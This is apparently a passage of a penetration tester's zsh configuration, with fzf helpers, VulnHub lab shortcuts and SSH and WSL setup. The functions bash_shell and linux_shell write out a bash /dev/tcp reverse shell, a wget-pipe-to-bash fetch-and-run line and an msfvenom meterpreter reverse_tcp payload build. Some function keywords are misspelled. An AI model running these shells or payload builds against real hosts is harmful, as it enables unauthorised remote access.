        cd $dir
    fi
}
function cdv() {
    dir=$(fd -d 1 . --type=d --full-path ${HOME}/vulnhub --color=always |fzf --preview 'exa --icons  {}')
    cd $dir
}
function cdh() {
    dir=$(fd  . --type=d --full-path ${HOME}/vulnhub --color=always |fzf --preview 'exa --icons  {}')
    cd $dir
}
function rmv() {
    dir=$(fd -d 1  . --type=d --full-path ${HOME}/vulnhub --color=always |fzf --preview 'exa --icons  {}')
    rm -fr  $dir
}
function make-cache(){
    msfvenom --list payload |tail -n +8 | sed 's/^ *//g'> ${HOME}/.cache/msf/payload
    msfvenom --list format | tail -n +8 | sed 's/^ *//g'> ${HOME}/.cache/msf/format
    echo "all done\n"
    return 0
}
alias pdict=_pdict
function _pdict(){
    fd . "${HOME}/dict" | fzf | tr -d '\n' |clipcopy
}
function hcat(){
    file=$(fd . --full-path "${HOST_ROOT_PATH}" -t f| fzf | tr -d '\n')
    cat $file

}
function hcd(){
     dir=$(fd . --full-path "${HOST_ROOT_PATH}"  -t d| fzf | tr -d '\n')
     cd $dir

}
function udf_pick(){
    UDF_PATH=$(fd . --full-path "${HOME}/.zinit/plugins/sqlmap/data/udf" -t f | fzf)
    FILE_NAME=$(basename $UDF_PATH )
    # echo ${FILE_NAME%?}
    python3 ${HOME}/.zinit/plugins/sqlmap/extra/cloak/cloak.py -d -i $UDF_PATH  -o ${FILE_NAME%?}
}
function man(){
	MAN="/usr/bin/man"
	if [ -n "$1" ]; then
		$MAN "$@"
		return $?
	else
		$MAN -k . | fzf --reverse --preview="echo {1,2} | sed 's/ (/./' | sed -E 's/\)\s*$//' | xargs $MAN" | awk '{print $1 "." $2}' | tr -d '()' | xargs -r $MAN
		return $?
	fi
}
function clash_start(){
    clash 1>/tmp/clash_log 2>/tmp/clash_error&
}
function clash_stop(){
    pid=$(ps | grep clash | sed 's/^[[:space:]]*//' | cut -d ' ' -f 1)
    kill -9 $pid
    rm -f /tmp/clash*
}
function docker_link(){
    file=$(fd . ${HOME/}/.config/docker_compose/ -d 1 --type=f  --color=always  | fzf --ansi --preview-window 'right:60%' --preview 'bat --color=always --style=header,grid --line-range :300 {}' )
    if test -n "$file";then
        rm -f ${HOME}/docker-compose.yaml
        ln -s $file  ./
    fi

    
}
# 处理 sshd 包括设置公钥登录, 取消密码登录
function my-ssh-config(){
    sed '/PasswordAuthentication/d' /etc/ssh/sshd_config
    sed '/PubkeyAuthentication/d'  /etc/ssh/sshd_config
    curl https://github.com/coxianyu.keys >> ${HOME}/.ssh/authorized_keys
    echo '###################custom##############' >> /etc/ssh/sshd_config
    echo 'PasswordAuthentication no '>> /etc/ssh/sshd_config
    echo 'PubkeyAuthentication yes' >> /etc/ssh/sshd_config
    echo 'StreamLocalBindUnlink yes '>> /etc/ssh/sshd_config
    echo  '#######################################' >> /etc/ssh/sshd_config
    chmod 600 -R ${HOME}/.ssh
}
function cpv(){
    file=$(fd . "${HOME}/.config/vimspector" -d 1 --type=f  --color=always  | fzf --ansi --preview-window 'right:60%' --preview 'bat --color=always --style=header,grid --line-range :300 {}')
    if test -n "$file";then
        cp $file ./.vimspector.json
    fi
}
function ef(){
    file=$(fd -d 1 --type=f  --color=always  | fzf --ansi --preview-window 'right:60%' --preview 'bat --color=always --style=header,grid --line-range :300 {}' )
    if test -n "$file";then
        $EDITOR $file
    fi
    
}
function systemctl_link(){
    for i in $(\find ${HOME}/.config/service/ -type f)
    do
        ln -s $i /etc/systemd/system/$(basename $i)
    done
}
function efa(){
    if [ $1 ];then
        dir=$1
    else
        dir=.
    fi
    file=$(fd . --type=f --full-path "$dir" --color=always -H -E ".git"  -E ".vim"| fzf --ansi --preview-window 'right:60%' --preview 'bat --color=always --style=header,grid --line-range :300 {}')
    if test -n "$file";then
        $EDITOR $file
    fi
}

function wan_ip(){
    export WAN_IP=$(curl ifconfig.me)
}
fucntion get_tmux(){
    name=$(tmux ls | cut -d '-' -f 1|fzf)
    tmux a -t $name
}
function add_server(){
    # read -p "enter port" port
    # read -p "enter server" service
    # mkdir "$port-$service"
}
fucntion log_start(){
    exec > logfile 2>&1
    set -x
}
functio bash_shell(){
    echo "bash -i >& /dev/tcp/$LOCAL_IP/443 0>&1" > /tmp/temp_bash
    echo "wget -O -  http://$LOCAL_IP:8080/temp_bash | bash" | clipcopy
}
function linux_shell(){
    msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$LOCAL_IP LPORT=443 --platform linux -f elf -o /tmp/temp
    cd /tmp
    echo "wget http://$LOCAL_IP:8080/temp" | clipcopy
}
function wget_echo(){
    echo "wget http://$LOCAL_IP:8080/$1" | tee | clipcopy
}
# fkill - kill process
fkill() {
  local pid
  # pid=$(ps -ef |grep -v ^root | sed 1d | fzf -m | awk '{print $2}')
  pid=$(ps -ef |egrep -v '\[.*\]' | sed 1d | fzf -m | awk '{print $2}')

  if [ "x$pid" != "x" ]
  then
    echo $pid | xargs kill -${1:-9}
  fi
}
function ssht () {/usr/bin/ssh -t "$@" "tmux attach -s 'master' || tmux new -t 'master' ";}
function src() {
	local cache="$ZSH_CACHE_DIR"
	autoload -U compinit zrecompile
	compinit -i -d "$cache/zcomp-$HOST"

	for f in ${ZDOTDIR:-~}/.zshrc "$cache/zcomp-$HOST"; do
		zrecompile -p $f && command rm -f $f.zwc.old
	done

	# Use $SHELL if it's available and a zsh shell
	local shell="$ZSH_ARGZERO"
	if [[ "${${SHELL:t}#-}" = zsh ]]; then
		shell="$SHELL"
	fi

	# Remove leading dash if login shell and run accordingly
	if [[ "${shell:0:1}" = "-" ]]; then
		exec -l "${shell#-}"
	else
		exec "$shell"
	fi
}
function alias-search(){
    alias | fzf
}
zinit ice id-as="p10k.zsh"
zinit snippet $(echo ${HOME}/.p10k.zsh)
#}}} 
# 设置 c 库位置{{{
export LD_LIBRARY_PATH=${LD_LIBRARY_PATH}:${HOME}/.local/lib
export C_INCLUDE_PATH=${C_INCLUDE_PATH}:${HOME}/.local/include
export CPLUS_INCLUDE_PATH=${CPLUS_INCLUDE_PATH}:${HOME}/.local/include
# }}}
# WSL 环境变量设置{{{
uname -a | rg WSL 1>/dev/null 2>&1
if test "$?" -eq 0;then
   export GIT_SSH="/mnt/c/Windows/System32/OpenSSH/ssh.exe"
   alias gpg="gpg.exe"
   alias ssh="ssh.exe"
fi
# }}}
